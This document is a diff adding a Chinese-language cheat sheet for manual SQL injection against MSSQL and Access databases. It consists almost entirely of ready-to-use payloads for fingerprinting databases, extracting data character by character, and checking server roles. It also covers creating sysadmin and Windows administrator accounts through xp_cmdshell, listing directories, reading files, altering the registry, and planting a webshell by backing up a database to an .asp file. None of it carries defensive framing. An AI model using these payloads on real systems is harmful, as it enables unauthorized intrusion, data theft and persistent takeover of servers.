@@ -1,0 +1,103 @@
+手工脚本注入 
+1.判断是否有注入;and 1=1 ;and 1=2 
+
+2.初步判断是否是mssql ;and user>0 
+
+3.注入参数是字符'and [查询条件] and ''=' 
+
+4.搜索时没过滤参数的'and [查询条件] and '%25'=' 
+
+5.判断数据库系统 
+;and (select count(*) from sysobjects)>0 mssql 
+;and (select count(*) from msysobjects)>0 access 
+
+6.猜数据库 ;and (select Count(*) from [数据库名])>0 
+
+7.猜字段 ;and (select Count(字段名) from 数据库名)>0 
+
+8.猜字段中记录长度 ;and (select top 1 len(字段名) from 数据库名)>0 
+
+9.(1)猜字段的ascii值（access） 
+;and (select top 1 asc(mid(字段名,1,1)) from 数据库名)>0 
+
+(2)猜字段的ascii值（mssql） 
+;and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)>0 
+
+10.测试权限结构（mssql） 
+;and 1=(select IS_SRVROLEMEMBER('sysadmin'));-- 
+;and 1=(select IS_SRVROLEMEMBER('serveradmin'));-- 
+;and 1=(select IS_SRVROLEMEMBER('setupadmin'));-- 
+;and 1=(select IS_SRVROLEMEMBER('securityadmin'));-- 
+;and 1=(select IS_SRVROLEMEMBER('diskadmin'));-- 
+;and 1=(select IS_SRVROLEMEMBER('bulkadmin'));-- 
+;and 1=(select IS_MEMBER('db_owner'));-- 
+
+11.添加mssql和系统的帐户 
+;exec master.dbo.sp_addlogin username;-- 
+
+;exec master.dbo.sp_password null,username,password;-- 
+
+;exec master.dbo.sp_addsrvrolemember sysadmin username;-- 
+
+;exec master.dbo.xp_cmdshell 'net user username password 
+/workstations:*/times:all/passwordchg:yes /passwordreq:yes /active:yes /add';-- 
+
+;exec master.dbo.xp_cmdshell 'net user username password /add';-- 
+
+;exec master.dbo.xp_cmdshell 'net localgroup administrators username /add';-- 
+
+12.(1)遍历目录 
+
+;create table dirs(paths varchar(100), id int) 
+;insert dirs exec master.dbo.xp_dirtree 'c:\' 
+;and (select top 1 paths from dirs)>0 
+;and (select top 1 paths from dirs where paths not in('上步得到的paths'))>) 
+
+(2)遍历目录 
+;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));-- 
+;insert temp exec master.dbo.xp_availablemedia;-- 获得当前所有驱动器 
+;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';-- 获得子目录列表 
+;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- 获得所有子目录的目录树构 
+;insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';-- 查看文件的内容 
+
+13.mssql中的存储过程 
+
+xp_regenumvalues 注册表根键, 子键 
+;exec xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 以多个记录集方式返回所有键值 
+
+xp_regread 根键,子键,键值名 
+;exec xp_regread 
+'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','CommonFilesDir' 返回制定键的值 
+
+xp_regwrite 根键,子键, 值名, 值类型, 值 
+值类型有2种REG_SZ 表示字符型,REG_DWORD 表示整型 
+;exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName','reg_sz','hello' 写入注册表 
+
+xp_regdeletevalue 根键,子键,值名 
+
+exec xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName' 删除某个值 
+
+xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Testkey' 删除键,包括该键下所有值 
+
+14.mssql的backup创建webshell 
+use model 
+create table cmd(str image); 
+insert into cmd(str) values (''); 
+backup database model to disk='c:\l.asp'; 
+
+15.mssql内置函数 
+;and (select @@version)>0 获得Windows的版本号 
+;and user_name()='dbo' 判断当前系统的连接用户是不是sa 
+;and (select user_name())>0 爆当前系统的连接用户 
+;and (select db_name())>0 得到当前连接的数据库 
+
+16.简洁的webshell 
+
+use model 
+
+create table cmd(str image); 
+
+insert into cmd(str) values (''); 
+
+backup database model to disk='g:\wwwtest\l.asp'; 
+ 
